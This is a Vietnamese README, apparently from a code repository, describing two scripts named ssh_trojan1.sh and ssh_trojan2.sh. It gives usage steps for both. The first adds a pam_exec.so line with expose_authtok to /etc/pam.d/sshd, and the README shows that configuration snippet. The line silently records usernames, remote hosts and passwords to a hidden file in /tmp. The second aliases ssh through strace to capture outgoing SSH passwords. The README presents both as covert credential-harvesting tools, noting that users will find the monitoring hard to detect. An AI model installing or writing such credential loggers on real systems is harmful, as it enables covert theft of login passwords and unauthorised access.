# Chương trình ssh_trojan1.sh

## Cách hoạt động
Ta thêm phần configuration sau để sử dụng module ***pam_exec.so*** vào trong file ***/etc/pam.d/sshd***
```
file_sshd="/etc/pam.d/sshd"

cat << EOF >> $file_sshd
@include common-auth
# use module pam_exec to call an external command
auth       required   pam_exec.so   expose_authtok   seteuid   log=$file_log   $path_script
EOF
```
Bằng cách sử dụng module ***pam_exec.so*** trong quá trình xác thực của tiến trình ***sshd***, ta sẽ chèn thêm đoạn script tự động thực hiện việc ghi lại các biến được sử dụng trong quá trình xác thực người dùng sử dụng ***ssh*** vào trong file ***/tmp/.log_sshtrojan1.txt***. Sử dụng module ***pam_exec.so*** đảm bảo hệ thống sẽ tự động ghi lại hoạt động đăng nhập của người dùng mà không hiển thị thông báo, điều này khiến người dùng khó có thể phát hiện ra việc hệ thống đang bị theo dõi.

Thông tin về ***date***, ***username***, ***remote host***, ***password*** được lưu trong file ***/tmp/.log_sshtrojan1.txt***

## Cách sử dụng
- Bước 1: Di chuyển vào thư mục chứa file ***ssh_trojan1.sh***
- Bước 2: Thực hiện câu lệnh sau trên terminal.

```
sudo /bin/bash ssh_trojan1.sh
```
Nếu không thực hiện với đặc quyền ***sudo***, chương trình sẽ báo lỗi.

# Chương trình ssh_trojan2.sh

## Cách hoạt động
Chương trình sử dụng hàm ***strace*** để theo dõi các lời gọi hệ thống và các tham số truyền vào các lời gọi hàm của tiến trình ***ssh***. file ***setup_ssh_trojan.sh*** sẽ thực hiện thêm ***alias*** vào trong môi trường terminal với mục đích mỗi lần người dùng sử dụng câu lệnh ssh, thực ra đang thực hiện lệnh ***ssh*** với sự giám sát của hàm strace. Hàm ***strace*** sẽ theo dõi và ghi log vào 1 file tạm thời trong thư mục ***/tmp***. Sau đấy, chương trình ***ssh_trojan2.sh*** sẽ đọc qua các log này và ghi lại những thông tin liên quan đến việc kết nối ***ssh*** đến máy khác. Chương trình ***ssh_trojan2.sh*** có thể theo dõi nhiều kết nối ***ssh*** cùng một lúc và có thể chỉ ra đâu là kết nối thành công và đâu là kết nối không thành công.

Thông tin về ***date***, ***username***, ***remote host***, ***password*** được lưu trong file ***/tmp/.log_sshtrojan2.txt***

## Cách sử dụng
- Bước 1: Di chuyển vào thư mục chứa file ***setup_ssh_trojan2.sh*** và ***ssh_trojan2.sh***
- Bước 2: Thực hiện câu lệnh sau trên terminal
```
sudo /bin/bash setup_ssh_trojan2.sh
```
Nếu không thực hiện với đặc quyền ***sudo***, chương trình sẽ báo lỗi.
# Đóng góp
Tác giả: Nguyễn Minh Mạnh | [Facebook profile](https://www.facebook.com/minhmannh2001/)
